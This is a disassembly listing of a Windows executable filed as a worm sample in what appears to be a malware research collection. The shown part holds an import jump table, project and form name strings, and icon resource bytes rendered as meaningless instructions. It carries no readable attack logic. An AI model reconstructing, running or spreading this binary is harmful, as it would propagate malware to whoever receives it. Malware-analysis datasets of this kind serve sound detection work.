
malware_samples/worm/616fb612b824f7b21e9c5bb06fe7c8e93ca87429cdd1105a932a75e6c4bf274a.exe:     file format pei-i386


Disassembly of section UPX0:

00401000 <UPX0>:
  401000:	35 b0 01 00 51       	xor    $0x510001b0,%eax
  401005:	02 00                	add    (%eax),%al
  401007:	80 52 02 00          	adcb   $0x0,0x2(%edx)
  40100b:	80 53 02 00          	adcb   $0x0,0x2(%ebx)
  40100f:	80 56 02 00          	adcb   $0x0,0x2(%esi)
  401013:	80 0d 02 00 80 0e 02 	orb    $0x2,0xe800002
  40101a:	00 80 46 b0 01 00    	add    %al,0x1b046(%eax)
  401020:	11 02                	adc    %eax,(%edx)
  401022:	00 80 5a b0 01 00    	add    %al,0x1b05a(%eax)
  401028:	9e                   	sahf
  401029:	02 00                	add    (%eax),%al
  40102b:	80 6c b0 01 00       	subb   $0x0,0x1(%eax,%esi,4)
  401030:	58                   	pop    %eax
  401031:	02 00                	add    (%eax),%al
  401033:	80 59 02 00          	sbbb   $0x0,0x2(%ecx)
  401037:	80 81 b0 01 00 9d b0 	addb   $0xb0,-0x62fffe50(%ecx)
  40103e:	01 00                	add    %eax,(%eax)
  401040:	5f                   	pop    %edi
  401041:	02 00                	add    (%eax),%al
  401043:	80 60 02 00          	andb   $0x0,0x2(%eax)
  401047:	80 12 02             	adcb   $0x2,(%edx)
  40104a:	00 80 cc 02 00 80    	add    %al,-0x7ffffd34(%eax)
  401050:	b2 b0                	mov    $0xb0,%dl
  401052:	01 00                	add    %eax,(%eax)
  401054:	19 02                	sbb    %eax,(%edx)
  401056:	00 80 85 02 00 80    	add    %al,-0x7ffffd7b(%eax)
  40105c:	3a 02                	cmp    (%edx),%al
  40105e:	00 80 ad 02 00 80    	add    %al,-0x7ffffd53(%eax)
  401064:	64 00 00             	add    %al,%fs:(%eax)
  401067:	80 68 02 00          	subb   $0x0,0x2(%eax)
  40106b:	80 1e 02             	sbbb   $0x2,(%esi)
  40106e:	00 80 21 02 00 80    	add    %al,-0x7ffffddf(%eax)
  401074:	22 02                	and    (%edx),%al
  401076:	00 80 23 02 00 80    	add    %al,-0x7ffffddd(%eax)
  40107c:	44                   	inc    %esp
  40107d:	02 00                	add    (%eax),%al
  40107f:	80 00 00             	addb   $0x0,(%eax)
	...
  40108e:	00 00                	add    %al,(%eax)
  401090:	ff 25 24 10 40 00    	jmp    *0x401024
  401096:	ff 25 28 10 40 00    	jmp    *0x401028
  40109c:	ff 25 48 10 40 00    	jmp    *0x401048
  4010a2:	ff 25 0c 10 40 00    	jmp    *0x40100c
  4010a8:	ff 25 60 10 40 00    	jmp    *0x401060
  4010ae:	ff 25 7c 10 40 00    	jmp    *0x40107c
  4010b4:	ff 25 58 10 40 00    	jmp    *0x401058
  4010ba:	ff 25 30 10 40 00    	jmp    *0x401030
  4010c0:	ff 25 4c 10 40 00    	jmp    *0x40104c
  4010c6:	ff 25 34 10 40 00    	jmp    *0x401034
  4010cc:	ff 25 44 10 40 00    	jmp    *0x401044
  4010d2:	ff 25 04 10 40 00    	jmp    *0x401004
  4010d8:	ff 25 20 10 40 00    	jmp    *0x401020
  4010de:	ff 25 10 10 40 00    	jmp    *0x401010
  4010e4:	ff 25 5c 10 40 00    	jmp    *0x40105c
  4010ea:	ff 25 14 10 40 00    	jmp    *0x401014
  4010f0:	ff 25 08 10 40 00    	jmp    *0x401008
  4010f6:	ff 25 18 10 40 00    	jmp    *0x401018
  4010fc:	ff 25 68 10 40 00    	jmp    *0x401068
  401102:	ff 25 54 10 40 00    	jmp    *0x401054
  401108:	ff 25 40 10 40 00    	jmp    *0x401040
  40110e:	ff 25 74 10 40 00    	jmp    *0x401074
  401114:	ff 25 78 10 40 00    	jmp    *0x401078
  40111a:	ff 25 6c 10 40 00    	jmp    *0x40106c
  401120:	ff 25 70 10 40 00    	jmp    *0x401070
  401126:	ff 25 3c 10 40 00    	jmp    *0x40103c
  40112c:	ff 25 50 10 40 00    	jmp    *0x401050
  401132:	ff 25 38 10 40 00    	jmp    *0x401038
  401138:	ff 25 1c 10 40 00    	jmp    *0x40101c
  40113e:	ff 25 2c 10 40 00    	jmp    *0x40102c
  401144:	ff 25 00 10 40 00    	jmp    *0x401000
  40114a:	ff 25 64 10 40 00    	jmp    *0x401064
  401150:	68 94 6d 40 00       	push   $0x406d94
  401155:	e8 f0 ff ff ff       	call   0x40114a
  40115a:	00 00                	add    %al,(%eax)
  40115c:	00 00                	add    %al,(%eax)
  40115e:	00 00                	add    %al,(%eax)
  401160:	30 00                	xor    %al,(%eax)
  401162:	00 00                	add    %al,(%eax)
  401164:	40                   	inc    %eax
  401165:	00 00                	add    %al,(%eax)
  401167:	00 00                	add    %al,(%eax)
  401169:	00 00                	add    %al,(%eax)
  40116b:	00 74 80 01          	add    %dh,0x1(%eax,%eax,4)
  40116f:	d8 d8                	fcomp  %st(0)
  401171:	dd 3b                	fnstsw (%ebx)
  401173:	46                   	inc    %esi
  401174:	ac                   	lods   %ds:(%esi),%al
  401175:	75 c5                	jne    0x40113c
  401177:	41                   	inc    %ecx
  401178:	e4 2c                	in     $0x2c,%al
  40117a:	df 89 00 00 00 00    	fisttps 0x0(%ecx)
  401180:	00 00                	add    %al,(%eax)
  401182:	01 00                	add    %eax,(%eax)
	...
  40118c:	50                   	push   %eax
  40118d:	72 6f                	jb     0x4011fe
  40118f:	6a 65                	push   $0x65
  401191:	63 74 31 00          	arpl   %esi,0x0(%ecx,%esi,1)
	...
  40119d:	00 00                	add    %al,(%eax)
  40119f:	00 ff                	add    %bh,%bh
  4011a1:	cc                   	int3
  4011a2:	31 00                	xor    %eax,(%eax)
  4011a4:	02 c7                	add    %bh,%al
  4011a6:	f4                   	hlt
  4011a7:	c7 86 c1 0b 4e 4b 81 	movl   $0x720b2081,0x4b4e0bc1(%esi)
  4011ae:	20 0b 72 
  4011b1:	96                   	xchg   %eax,%esi
  4011b2:	e3 2b                	jecxz  0x4011df
  4011b4:	80 7e 7c 1e          	cmpb   $0x1e,0x7c(%esi)
  4011b8:	e7 35                	out    %eax,$0x35
  4011ba:	11 a7 40 9e df 91    	adc    %esp,-0x6e2061c0(%edi)
  4011c0:	11 86 f8 b3 4d 3a    	adc    %eax,0x3a4db3f8(%esi)
  4011c6:	4f                   	dec    %edi
  4011c7:	ad                   	lods   %ds:(%esi),%eax
  4011c8:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  4011ce:	0c 00                	or     $0x0,%al
  4011d0:	aa                   	stos   %al,%es:(%edi)
  4011d1:	00 60 d3             	add    %ah,-0x2d(%eax)
  4011d4:	93                   	xchg   %eax,%ebx
	...
  4011f9:	73 58                	jae    0x401253
  4011fb:	00 00                	add    %al,(%eax)
  4011fd:	2b 58 00             	sub    0x0(%eax),%ebx
  401200:	00 00                	add    %al,(%eax)
  401202:	08 00                	or     %al,(%eax)
  401204:	66 72 6d             	data16 jb 0x401274
  401207:	5f                   	pop    %edi
  401208:	6d                   	insl   (%dx),%es:(%edi)
  401209:	61                   	popa
  40120a:	69 6e 00 0d 01 04 00 	imul   $0x4010d,0x0(%esi),%ebp
  401211:	4d                   	dec    %ebp
  401212:	61                   	popa
  401213:	69 6e 00 03 05 00 00 	imul   $0x503,0x0(%esi),%ebp
  40121a:	80 19 01             	sbbb   $0x1,(%ecx)
  40121d:	00 42 00             	add    %al,0x0(%edx)
  401220:	22 00                	and    (%eax),%al
  401222:	23 de                	and    %esi,%ebx
  401224:	57                   	push   %edi
  401225:	00 00                	add    %al,(%eax)
  401227:	6c                   	insb   (%dx),%es:(%edi)
  401228:	74 00                	je     0x40122a
  40122a:	00 d6                	add    %dl,%dh
  40122c:	57                   	push   %edi
  40122d:	00 00                	add    %al,(%eax)
  40122f:	00 00                	add    %al,(%eax)
  401231:	01 00                	add    %eax,(%eax)
  401233:	06                   	push   %es
  401234:	00 30                	add    %dh,(%eax)
  401236:	30 00                	xor    %al,(%eax)
  401238:	00 01                	add    %al,(%ecx)
  40123a:	00 08                	add    %cl,(%eax)
  40123c:	00 a8 0e 00 00 66    	add    %ch,0x6600000e(%eax)
  401242:	00 00                	add    %al,(%eax)
  401244:	00 20                	add    %ah,(%eax)
  401246:	20 00                	and    %al,(%eax)
  401248:	00 01                	add    %al,(%ecx)
  40124a:	00 08                	add    %cl,(%eax)
  40124c:	00 a8 08 00 00 0e    	add    %ch,0xe000008(%eax)
  401252:	0f 00 00             	sldt   (%eax)
  401255:	10 10                	adc    %dl,(%eax)
  401257:	00 00                	add    %al,(%eax)
  401259:	01 00                	add    %eax,(%eax)
  40125b:	08 00                	or     %al,(%eax)
  40125d:	68 05 00 00 b6       	push   $0xb6000005
  401262:	17                   	pop    %ss
  401263:	00 00                	add    %al,(%eax)
  401265:	30 30                	xor    %dh,(%eax)
  401267:	00 00                	add    %al,(%eax)
  401269:	01 00                	add    %eax,(%eax)
  40126b:	20 00                	and    %al,(%eax)
  40126d:	a8 25                	test   $0x25,%al
  40126f:	00 00                	add    %al,(%eax)
  401271:	1e                   	push   %ds
  401272:	1d 00 00 20 20       	sbb    $0x20200000,%eax
  401277:	00 00                	add    %al,(%eax)
  401279:	01 00                	add    %eax,(%eax)
  40127b:	20 00                	and    %al,(%eax)
  40127d:	a8 10                	test   $0x10,%al
  40127f:	00 00                	add    %al,(%eax)
  401281:	c6 42 00 00          	movb   $0x0,0x0(%edx)
  401285:	10 10                	adc    %dl,(%eax)
  401287:	00 00                	add    %al,(%eax)
  401289:	01 00                	add    %eax,(%eax)
  40128b:	20 00                	and    %al,(%eax)
  40128d:	68 04 00 00 6e       	push   $0x6e000004
  401292:	53                   	push   %ebx
  401293:	00 00                	add    %al,(%eax)
  401295:	28 00                	sub    %al,(%eax)
  401297:	00 00                	add    %al,(%eax)
  401299:	30 00                	xor    %al,(%eax)
  40129b:	00 00                	add    %al,(%eax)
  40129d:	60                   	pusha
  40129e:	00 00                	add    %al,(%eax)
  4012a0:	00 01                	add    %al,(%ecx)
  4012a2:	00 08                	add    %cl,(%eax)
  4012a4:	00 00                	add    %al,(%eax)
  4012a6:	00 00                	add    %al,(%eax)
  4012a8:	00 80 0a 00 00 00    	add    %al,0xa(%eax)
	...
  4012b6:	01 00                	add    %eax,(%eax)
	...
  4012c0:	00 ff                	add    %bh,%bh
  4012c2:	ff                   	(bad)
  4012c3:	ff 00                	incl   (%eax)
  4012c5:	00 88 c0 00 00 88    	add    %cl,-0x77ffff40(%eax)
  4012cb:	bc 00 00 8c c0       	mov    $0xc08c0000,%esp
  4012d0:	00 00                	add    %al,(%eax)
  4012d2:	8c c4                	mov    %es,%esp
  4012d4:	00 00                	add    %al,(%eax)
  4012d6:	90                   	nop
  4012d7:	cc                   	int3
  4012d8:	00 00                	add    %al,(%eax)
  4012da:	90                   	nop
  4012db:	c8 00 20 a0          	enter  $0x2000,$0xa0
  4012df:	d0 00                	rolb   $1,(%eax)
  4012e1:	40                   	inc    %eax
  4012e2:	ac                   	lods   %ds:(%esi),%al
  4012e3:	d8 00                	fadds  (%eax)
  4012e5:	60                   	pusha
  4012e6:	b8 dc 00 80 c8       	mov    $0xc88000dc,%eax
  4012eb:	e4 00                	in     $0x0,%al
  4012ed:	8c cc                	mov    %cs,%esp
  4012ef:	e8 00 bc e4 f0       	call   0xf124cef4
  4012f4:	00 cc                	add    %cl,%ah
  4012f6:	e8 f4 00 fc fc       	call   0xfd3c13ef
  4012fb:	fc                   	cld
  4012fc:	00 00                	add    %al,(%eax)
  4012fe:	7c b0                	jl     0x4012b0
  401300:	00 10                	add    %dl,(%eax)
  401302:	98                   	cwtl
  401303:	cc                   	int3
  401304:	00 e8                	add    %ch,%al
  401306:	f4                   	hlt
  401307:	fc                   	cld
  401308:	00 f8                	add    %bh,%al
  40130a:	fc                   	cld
  40130b:	fc                   	cld
  40130c:	00 e0                	add    %ah,%al
  40130e:	fc                   	cld
  40130f:	fc                   	cld
  401310:	00 c8                	add    %cl,%al
  401312:	fc                   	cld
  401313:	fc                   	cld
  401314:	00 c0                	add    %al,%al
  401316:	fc                   	cld
  401317:	fc                   	cld
  401318:	00 b0 fc fc 00 4c    	add    %dh,0x4c00fcfc(%eax)
  40131e:	b0 dc                	mov    $0xdc,%al
  401320:	00 00                	add    %al,(%eax)
  401322:	48                   	dec    %eax
  401323:	64 00 00             	add    %al,%fs:(%eax)
  401326:	84 b8 00 78 c4 e4    	test   %bh,-0x1b3b8800(%eax)
  40132c:	00 ec                	add    %ch,%ah
  40132e:	f8                   	clc
  40132f:	fc                   	cld
  401330:	00 9c fc fc 00 98 fc 	add    %bl,-0x367ff04(%esp,%edi,8)
  401337:	fc                   	cld
  401338:	00 d0                	add    %dl,%al
  40133a:	fc                   	cld
  40133b:	fc                   	cld
  40133c:	00 e4                	add    %ah,%ah
  40133e:	f4                   	hlt
  40133f:	fc                   	cld
  401340:	00 20                	add    %ah,(%eax)
  401342:	98                   	cwtl
  401343:	c8 00 00 2c          	enter  $0x0,$0x2c
  401347:	40                   	inc    %eax
  401348:	00 1c 9c             	add    %bl,(%esp,%ebx,4)
  40134b:	d0 00                	rolb   $1,(%eax)
  40134d:	3c ac                	cmp    $0xac,%al
  40134f:	d8 00                	fadds  (%eax)
  401351:	68 c0 e0 00 a8       	push   $0xa800e0c0
  401356:	d8 ec                	fsubr  %st(4),%st
  401358:	00 b8 e0 f0 00 f4    	add    %bh,-0xbff0f20(%eax)
  40135e:	fc                   	cld
  40135f:	fc                   	cld
  401360:	00 e8                	add    %ch,%al
  401362:	f8                   	clc
  401363:	fc                   	cld
  401364:	00 dc                	add    %bl,%ah
  401366:	fc                   	cld
  401367:	fc                   	cld
  401368:	00 0c 98             	add    %cl,(%eax,%ebx,4)
  40136b:	cc                   	int3
  40136c:	00 e0                	add    %ah,%al
  40136e:	f0 fc                	lock cld
  401370:	00 c4                	add    %al,%ah
  401372:	f8                   	clc
  401373:	fc                   	cld
  401374:	00 e0                	add    %ah,%al
  401376:	f8                   	clc
  401377:	fc                   	cld
  401378:	00 c4                	add    %al,%ah
  40137a:	e4 f4                	in     $0xf4,%al
  40137c:	00 48 b0             	add    %cl,-0x50(%eax)
  40137f:	dc 00                	faddl  (%eax)
  401381:	88 cc                	mov    %cl,%ah
  401383:	e8 00 b4 e0 f0       	call   0xf120c788
  401388:	00 d0                	add    %dl,%al
  40138a:	ec                   	in     (%dx),%al
  40138b:	f8                   	clc
  40138c:	00 f0                	add    %dh,%al
  40138e:	f8                   	clc
  40138f:	fc                   	cld
  401390:	00 d8                	add    %bl,%al
  401392:	f8                   	clc
  401393:	fc                   	cld
  401394:	00 d0                	add    %dl,%al
  401396:	f8                   	clc
  401397:	fc                   	cld
  401398:	00 b4 f8 fc 00 a8 f8 	add    %dh,-0x757ff04(%eax,%edi,8)
  40139f:	fc                   	cld
  4013a0:	00 84 ec f8 00 70 e0 	add    %al,-0x1f8fff08(%esp,%ebp,8)
  4013a7:	f0 00 00             	lock add %al,(%eax)
  4013aa:	5c                   	pop    %esp
  4013ab:	80 00 00             	addb   $0x0,(%eax)
  4013ae:	8c c8                	mov    %cs,%eax
  4013b0:	00 94 d0 ec 00 e4 f8 	add    %dl,-0x71bff14(%eax,%edx,8)
  4013b7:	fc                   	cld
  4013b8:	00 dc                	add    %bl,%ah
  4013ba:	f8                   	clc
  4013bb:	fc                   	cld
  4013bc:	00 d4                	add    %dl,%ah
  4013be:	f8                   	clc
  4013bf:	fc                   	cld
  4013c0:	00 c0                	add    %al,%al
  4013c2:	f8                   	clc
  4013c3:	fc                   	cld
  4013c4:	00 b8 f8 fc 00 ac    	add    %bh,-0x53ff0308(%eax)
  4013ca:	f8                   	clc
  4013cb:	fc                   	cld
  4013cc:	00 8c f4 fc 00 60 d4 	add    %cl,-0x2b9fff04(%esp,%esi,8)
  4013d3:	ec                   	in     (%dx),%al
  4013d4:	00 4c c4 e4          	add    %cl,-0x1c(%esp,%eax,8)
  4013d8:	00 30                	add    %dh,(%eax)
  4013da:	b0 dc                	mov    $0xdc,%al
  4013dc:	00 24 ac             	add    %ah,(%esp,%ebp,4)
  4013df:	d8 00                	fadds  (%eax)
  4013e1:	50                   	push   %eax
  4013e2:	b4 dc                	mov    $0xdc,%ah
  4013e4:	00 ac dc ec 00 30 a4 	add    %ch,-0x5bcfff14(%esp,%ebx,8)
  4013eb:	d4 00                	aam    $0x0
  4013ed:	00 64 8c 00          	add    %ah,0x0(%esp,%ecx,4)
  4013f1:	a0 f8 fc 00 7c       	mov    0x7c00fcf8,%al
  4013f6:	e8 f4 00 2c a4       	call   0xa46c14ef
  4013fb:	d4 00                	aam    $0x0
  4013fd:	7c c8                	jl     0x4013c7
  4013ff:	e4 00                	in     $0x0,%al
  401401:	9c                   	pushf
  401402:	d4 ec                	aam    $0xec
  401404:	00 bc e0 f0 00 ec f4 	add    %bh,-0xb13ff10(%eax,%eiz,8)
  40140b:	fc                   	cld
  40140c:	00 d4                	add    %dl,%ah
  40140e:	f0 fc                	lock cld
  401410:	00 00                	add    %al,(%eax)
  401412:	40                   	inc    %eax
  401413:	58                   	pop    %eax
  401414:	00 e0                	add    %ah,%al
  401416:	f4                   	hlt
  401417:	fc                   	cld
  401418:	00 38                	add    %bh,(%eax)
  40141a:	b8 dc 00 d8 f0       	mov    $0xf0d800dc,%eax
  40141f:	f8                   	clc
  401420:	00 f0                	add    %dh,%al
  401422:	fc                   	cld
  401423:	fc                   	cld
  401424:	00 ec                	add    %ch,%ah
  401426:	fc                   	cld
  401427:	fc                   	cld
  401428:	00 e8                	add    %ch,%al
  40142a:	fc                   	cld
  40142b:	fc                   	cld
  40142c:	00 64 c4 fc          	add    %ah,-0x4(%esp,%eax,8)
  401430:	00 00                	add    %al,(%eax)
  401432:	34 48                	xor    $0x48,%al
  401434:	00 dc                	add    %bl,%ah
  401436:	f0 fc                	lock cld
  401438:	00 98 f8 fc 00 40    	add    %bl,0x4000fcf8(%eax)
  40143e:	c0 e0 00             	shl    $0x0,%al
  401441:	e4 fc                	in     $0xfc,%al
  401443:	fc                   	cld
  401444:	00 d8                	add    %bl,%al
  401446:	f0 fc                	lock cld
  401448:	00 a4 f0 fc 00 90 f4 	add    %ah,-0xb6fff04(%eax,%esi,8)
  40144f:	fc                   	cld
  401450:	00 74 e0 f4          	add    %dh,-0xc(%eax,%eiz,8)
  401454:	00 50 c8             	add    %dl,-0x38(%eax)
  401457:	e8 00 d8 fc fc       	call   0xfd3cec5c
  40145c:	00 d0                	add    %dl,%al
  40145e:	f0 f8                	lock clc
  401460:	00 9c ec fc 00 8c ec 	add    %bl,-0x1373ff04(%esp,%ebp,8)
  401467:	fc                   	cld
  401468:	00 7c e4 f8          	add    %bh,-0x8(%esp,%eiz,8)
  40146c:	00 68 d8             	add    %ch,-0x28(%eax)
  40146f:	f0 00 44 c0 e4       	lock add %al,-0x1c(%eax,%eax,8)
  401474:	00 2c ac             	add    %ch,(%esp,%ebp,4)
  401477:	dc 00                	faddl  (%eax)
  401479:	18 a4 d4 00 cc fc fc 	sbb    %ah,-0x3033400(%esp,%edx,8)
  401480:	00 ac e4 f0 00 00 74 	add    %ch,0x740000f0(%esp,%eiz,8)
  401487:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401488:	00 a8 dc f4 00 a4    	add    %ch,-0x5bff0b24(%eax)
  40148e:	e8 fc 00 6c d8       	call   0xd8ac158f
  401493:	f4                   	hlt
  401494:	00 28                	add    %ch,(%eax)
  401496:	ac                   	lods   %ds:(%esi),%al
  401497:	dc 00                	faddl  (%eax)
  401499:	68 bc e0 00 84       	push   $0x8400e0bc
  40149e:	cc                   	int3
  40149f:	e8 00 b0 e0 f0       	call   0xf120c4a4
  4014a4:	00 c4                	add    %al,%ah
  4014a6:	fc                   	cld
  4014a7:	fc                   	cld
  4014a8:	00 8c d4 ec 00 00 6c 	add    %cl,0x6c0000ec(%esp,%edx,8)
  4014af:	98                   	cwtl
  4014b0:	00 98 d4 f0 00 a4    	add    %bl,-0x5bff0f2c(%eax)
  4014b6:	e4 fc                	in     $0xfc,%al
  4014b8:	00 08                	add    %cl,(%eax)
  4014ba:	94                   	xchg   %eax,%esp
  4014bb:	cc                   	int3
  4014bc:	00 58 b8             	add    %bl,-0x48(%eax)
  4014bf:	dc 00                	faddl  (%eax)
  4014c1:	cc                   	int3
  4014c2:	ec                   	in     (%dx),%al
  4014c3:	f8                   	clc
  4014c4:	00 cc                	add    %cl,%ah
  4014c6:	f8                   	clc
  4014c7:	fc                   	cld
  4014c8:	00 bc fc fc 00 6c c8 	add    %bh,-0x3793ff04(%esp,%edi,8)
  4014cf:	e4 00                	in     $0x0,%al
  4014d1:	00 54 78 00          	add    %dl,0x0(%eax,%edi,2)
  4014d5:	94                   	xchg   %eax,%esp
  4014d6:	d4 f0                	aam    $0xf0
  4014d8:	00 80 d0 f0 00 b4    	add    %al,-0x4bff0f30(%eax)
  4014de:	fc                   	cld
  4014df:	fc                   	cld
  4014e0:	00 50 b8             	add    %dl,-0x48(%eax)
  4014e3:	dc 00                	faddl  (%eax)
  4014e5:	00 4c 6c 00          	add    %cl,0x0(%esp,%ebp,2)
  4014e9:	90                   	nop
  4014ea:	d0 f0                	shl    $1,%al
  4014ec:	00 7c cc f0          	add    %bh,-0x10(%esp,%ecx,8)
  4014f0:	00 38                	add    %bh,(%eax)
  4014f2:	ac                   	lods   %ds:(%esi),%al
  4014f3:	d8 00                	fadds  (%eax)
  4014f5:	ac                   	lods   %ds:(%esi),%al
  4014f6:	fc                   	cld
  4014f7:	fc                   	cld
  4014f8:	00 d4                	add    %dl,%ah
  4014fa:	fc                   	cld
  4014fb:	fc                   	cld
  4014fc:	00 34 ac             	add    %dh,(%esp,%ebp,4)
  4014ff:	d8 00                	fadds  (%eax)
  401501:	00 34 44             	add    %dh,(%esp,%eax,2)
  401504:	00 00                	add    %al,(%eax)
  401506:	84 bc 00 80 cc ec 00 	test   %bh,0xeccc80(%eax,%eax,1)
  40150d:	a0 fc fc 00 00       	mov    0xfcfc,%al
  401512:	1c 24                	sbb    $0x24,%al
  401514:	00 5c b8 e4          	add    %bl,-0x1c(%eax,%edi,4)
  401518:	00 64 c0 e8          	add    %ah,-0x18(%eax,%eax,8)
  40151c:	00 38                	add    %bh,(%eax)
  40151e:	a8 d8                	test   $0xd8,%al
  401520:	00 d0                	add    %dl,%al
  401522:	f4                   	hlt
  401523:	fc                   	cld
  401524:	00 58 b8             	add    %bl,-0x48(%eax)
  401527:	e4 00                	in     $0x0,%al
  401529:	44                   	inc    %esp
  40152a:	b0 dc                	mov    $0xdc,%al
  40152c:	00 cc                	add    %cl,%ah
  40152e:	f4                   	hlt
  40152f:	fc                   	cld
  401530:	00 9c e8 f4 00 00 7c 	add    %bl,0x7c0000f4(%eax,%ebp,8)
  401537:	ac                   	lods   %ds:(%esi),%al
  401538:	00 54 b8 e4          	add    %dl,-0x1c(%eax,%edi,4)
  40153c:	00 6c c0 e4          	add    %ch,-0x1c(%eax,%eax,8)
  401540:	00 c8                	add    %cl,%al
  401542:	f4                   	hlt
  401543:	fc                   	cld
  401544:	00 94 f4 fc 00 8c e0 	add    %dl,-0x1f73ff04(%esp,%esi,8)
  40154b:	f0 00 b4 f4 fc 00 68 	lock add %dh,-0x3397ff04(%esp,%esi,8)
  401552:	cc 
  401553:	e8 00 00 64 90       	call   0x90a41558
  401558:	00 30                	add    %dh,(%eax)
  40155a:	a8 dc                	test   $0xdc,%al
  40155c:	00 b0 f0 fc 00 8c    	add    %dh,-0x73ff0310(%eax)
  401562:	f0 fc                	lock cld
  401564:	00 58 c4             	add    %bl,-0x3c(%eax)
  401567:	e4 00                	in     $0x0,%al
  401569:	00 58 78             	add    %bl,0x78(%eax)
  40156c:	00 28                	add    %ch,(%eax)
  40156e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40156f:	d8 00                	fadds  (%eax)
  401571:	74 c8                	je     0x40153b
  401573:	e8 00 2c ac d8       	call   0xd8ec4178
  401578:	00 00                	add    %al,(%eax)
  40157a:	44                   	inc    %esp
  40157b:	60                   	pusha
  40157c:	00 24 a4             	add    %ah,(%esp,%eiz,4)
  40157f:	d8 00                	fadds  (%eax)
  401581:	9c                   	pushf
  401582:	d8 f0                	fdiv   %st(0),%st
  401584:	00 ac ec fc 00 88 e8 	add    %ch,-0x1777ff04(%esp,%ebp,8)
  40158b:	fc                   	cld
  40158c:	00 28                	add    %ch,(%eax)
  40158e:	ac                   	lods   %ds:(%esi),%al
  40158f:	d8 00                	fadds  (%eax)
  401591:	98                   	cwtl
  401592:	d8 f0                	fdiv   %st(0),%st
  401594:	00 98 e8 fc 00 84    	add    %bl,-0x7bff0318(%eax)
  40159a:	e8 fc 00 00 10       	call   0x1040169b
  40159f:	14 00                	adc    $0x0,%al
  4015a1:	24 a0                	and    $0xa0,%al
  4015a3:	d8 00                	fadds  (%eax)
  4015a5:	94                   	xchg   %eax,%esp
  4015a6:	e4 fc                	in     $0xfc,%al
  4015a8:	00 80 e4 fc 00 a0    	add    %al,-0x5fff031c(%eax)
  4015ae:	dc f4                	fdiv   %st,%st(4)
  4015b0:	00 90 e4 fc 00 80    	add    %dl,-0x7fff031c(%eax)
  4015b6:	e0 fc                	loopne 0x4015b4
  4015b8:	00 4c b8 f0          	add    %cl,-0x10(%eax,%edi,4)
  4015bc:	00 c4                	add    %al,%ah
  4015be:	ec                   	in     (%dx),%al
  4015bf:	fc                   	cld
  4015c0:	00 88 e0 fc 00 7c    	add    %cl,0x7c00fce0(%eax)
  4015c6:	dc fc                	fdivr  %st,%st(4)
  4015c8:	00 c0                	add    %al,%al
  4015ca:	ec                   	in     (%dx),%al
  4015cb:	fc                   	cld
  4015cc:	00 78 dc             	add    %bh,-0x24(%eax)
  4015cf:	fc                   	cld
  4015d0:	00 5c c8 f0          	add    %bl,-0x10(%eax,%ecx,8)
  4015d4:	00 44 bc e8          	add    %al,-0x18(%esp,%edi,4)
  4015d8:	00 24 a8             	add    %ah,(%eax,%ebp,4)
  4015db:	dc 00                	faddl  (%eax)
  4015dd:	04 94                	add    $0x94,%al
  4015df:	cc                   	int3
  4015e0:	00 00                	add    %al,(%eax)
  4015e2:	60                   	pusha
  4015e3:	84 00                	test   %al,(%eax)
  4015e5:	74 d8                	je     0x4015bf
  4015e7:	fc                   	cld
  4015e8:	00 70 d4             	add    %dh,-0x2c(%eax)
  4015eb:	fc                   	cld
  4015ec:	00 50 c0             	add    %dl,-0x40(%eax)
  4015ef:	ec                   	in     (%dx),%al
  4015f0:	00 3c b4             	add    %bh,(%esp,%esi,4)
  4015f3:	e4 00                	in     $0x0,%al
  4015f5:	1c a4                	sbb    $0xa4,%al
  4015f7:	d8 00                	fadds  (%eax)
  4015f9:	00 28                	add    %ch,(%eax)
  4015fb:	34 00                	xor    $0x0,%al
  4015fd:	bc ec fc 00 74       	mov    $0x7400fcec,%esp
  401602:	d4 fc                	aam    $0xfc
  401604:	00 64 cc f8          	add    %ah,-0x8(%esp,%ecx,8)
  401608:	00 48 bc             	add    %cl,-0x44(%eax)
  40160b:	ec                   	in     (%dx),%al
  40160c:	00 30                	add    %dh,(%eax)
  40160e:	b0 e0                	mov    $0xe0,%al
  401610:	00 14 9c             	add    %dl,(%esp,%ebx,4)
  401613:	d4 00                	aam    $0x0
  401615:	00 5c 84 00          	add    %bl,0x0(%esp,%eax,4)
  401619:	00 3c 54             	add    %bh,(%esp,%edx,2)
  40161c:	00 2c a8             	add    %ch,(%eax,%ebp,4)
  40161f:	d8 00                	fadds  (%eax)
  401621:	b4 e8                	mov    $0xe8,%ah
  401623:	fc                   	cld
  401624:	00 70 d0             	add    %dh,-0x30(%eax)
  401627:	fc                   	cld
  401628:	00 5c c4 f4          	add    %bl,-0xc(%esp,%eax,8)
  40162c:	00 40 b4             	add    %al,-0x4c(%eax)
  40162f:	e8 00 24 a4 dc       	call   0xdce43a34
  401634:	00 0c 98             	add    %cl,(%eax,%ebx,4)
  401637:	d0 00                	rolb   $1,(%eax)
  401639:	00 30                	add    %dh,(%eax)
  40163b:	44                   	inc    %esp
  40163c:	00 6c cc fc          	add    %ch,-0x4(%esp,%ecx,8)
  401640:	00 50 c0             	add    %dl,-0x40(%eax)
  401643:	f0 00 38             	lock add %bh,(%eax)
  401646:	b0 e4                	mov    $0xe4,%al
  401648:	00 1c a0             	add    %bl,(%eax,%eiz,4)
  40164b:	d8 00                	fadds  (%eax)
  40164d:	a0 e0 fc 00 68       	mov    0x6800fce0,%al
  401652:	cc                   	int3
  401653:	fc                   	cld
  401654:	00 64 c8 fc          	add    %ah,-0x4(%eax,%ecx,8)
  401658:	00 48 b8             	add    %cl,-0x48(%eax)
  40165b:	ec                   	in     (%dx),%al
  40165c:	00 2c ac             	add    %ch,(%esp,%ebp,4)
  40165f:	e0 00                	loopne 0x401661
  401661:	20 a0 d4 00 64 c4    	and    %ah,-0x3b9bff2c(%eax)
  401667:	ec                   	in     (%dx),%al
  401668:	00 00                	add    %al,(%eax)
  40166a:	0c 14                	or     $0x14,%al
  40166c:	00 00                	add    %al,(%eax)
  40166e:	70 9c                	jo     0x40160c
  401670:	00 00                	add    %al,(%eax)
  401672:	8a c0                	mov    %al,%al
  401674:	00 00                	add    %al,(%eax)
  401676:	88 be 00 00 8c c2    	mov    %bh,-0x3d740000(%esi)
  40167c:	00 00                	add    %al,(%eax)
  40167e:	8e c6                	mov    %esi,%es
  401680:	00 00                	add    %al,(%eax)
  401682:	92                   	xchg   %eax,%edx
  401683:	cc                   	int3
  401684:	00 00                	add    %al,(%eax)
  401686:	90                   	nop
  401687:	ca 00 20             	lret   $0x2000
  40168a:	a0 d2 00 40 ae       	mov    0xae4000d2,%al
  40168f:	d8 00                	fadds  (%eax)
